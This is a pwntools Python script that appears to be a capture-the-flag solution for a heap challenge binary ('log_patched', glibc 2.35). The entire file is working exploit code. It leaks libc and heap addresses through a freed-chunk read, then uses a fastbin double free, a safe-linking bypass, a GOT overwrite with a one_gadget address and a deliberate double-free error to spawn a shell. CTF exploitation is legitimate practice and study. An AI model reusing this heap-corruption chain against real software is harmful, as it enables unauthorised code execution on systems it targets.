#!python

from pwn import *
import pwn
from sys import argv
from os import getcwd
from time import sleep

speed = 0#.5

e = ELF("./log_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = e
context.terminal = ["kitty", "@", "new-window", "--cwd", getcwd()]
context.gdbinit = "/etc/profiles/per-user/darktar/share/pwndbg/gdbinit.py"

r: process = None

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: r.sendlineafter(a, b)
sa = lambda a, b: r.sendafter(a, b)
sl = lambda a: (sleep(speed), r.sendline(a))
s = lambda a: (sleep(speed), r.send(a))
recv = lambda: (sleep(speed), r.recv())[1]
recvn = lambda a: (sleep(speed), r.recvn(a))[1]
recvu = lambda a, b=False: (sleep(speed), r.recvuntil(a, b))[1]
clean = lambda: r.clean()
success = lambda a: log.success(a)
fail = lambda a: log.failure(a)
info = lambda a: log.info(a)

gdbscript = '''
    set resolve-heap-via-heuristic force
    continue
'''

def conn():
    global r
    if len(argv) > 1:
        if argv[1] == "gdb":
            r = gdb.debug([e.path], gdbscript=gdbscript)
        else:
            ip, port = argv[1], argv[2]
            r = remote(ip, port)
    else:
        r = e.process()


def send_message(size, data=b""):
    if data == b"":
        data = b"A"*size
    s(p32(0))
    s(p32(size))
    s(data)

def show_message(idx):
    s(p32(1))
    s(p32(idx))

def free_message(idx):
    s(p32(2))
    s(p32(idx))

def safe_link(fd, loc):
    return fd ^ (loc>>12) 

def exploit():
    input("1") # to fix bug when starting gdb

    # ----- LEAK LIBC BASE -----
    send_message(0x800) # -> unsorted bin
    free_message(0)
    #sleep(speed+1) # to fix bug in remote
    clean() # to fix buffer bug in local
    show_message(0)
    print("size")
    recvn(4)
    info(hex(u64(recvn(4))))
    libc.address = u64(recvn(8)) - 0x219ce0
    print("libc base")
    success(hex(libc.address))
    send_message(0x800) # alloc to prevent allocation from the unsorted bin

    # ----- LEAK HEAP BASE -----
    send_message(0x80)
    free_message(2)
    #sleep(speed+2)
    clean()
    show_message(2)
    print("size")
    recvn(4)
    info(hex(u64(recvn(4))))
    print("heap base")
    heap_addr = u64(recvn(0x8))<<12
    success(hex(heap_addr))
    
    # ----- CREATE 2 FASTBINS -----
    for _ in range(9):
        send_message(0x60)
    
    for _ in range(7):
        free_message(3)

    # ----- DOUBLE FREE -----
    free_message(4)
    free_message(3)
    free_message(4)

    # ----- CONTROL FWD -----
    for _ in range(7):
        send_message(0x60)

    # ----- POINT THE FWD INTO THE LIBC GOT -----    
    send_message(0x60, p64(safe_link(libc.address+0x219060, heap_addr+0x1090))+b"X"*(0x60-0x8))
    send_message(0x60)
    send_message(0x60)

    # ----- SPAM ONE GADGET TO SPAWN SHELL IN THE LIBC GOT -----
    one_gadget = 0xebdaf + libc.address
    payload = p64(one_gadget)*(0x60//0x8)

    send_message(0x60, payload)
    clean()

    # ----- TRIGGER ERROR MESSAGE TO JUMP TO LIBC -----
    free_message(2) # -> triggers double free error
    #sleep(speed+1)
    clean()

    print("good luck pwning :)")
    
    

conn()
exploit()

# good luck pwning :)
r.interactive()
